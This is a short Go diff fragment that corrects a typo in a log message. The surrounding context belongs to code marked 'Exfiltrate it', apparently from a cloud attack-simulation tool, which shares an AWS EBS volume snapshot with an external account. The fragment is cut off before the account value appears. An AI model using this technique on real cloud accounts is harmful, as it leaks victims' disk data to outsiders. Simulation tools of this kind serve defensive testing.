@@ -31,7 +31,7 @@ func init() {
 			}
 
 			// Exfiltrate it
-			log.Println("Sharing the volumme snapshot with an external AWS account ID...")
+			log.Println("Sharing the volume snapshot with an external AWS account ID...")
 			_, err = ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
 				SnapshotId: aws.String(ourSnapshotId),
 				Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
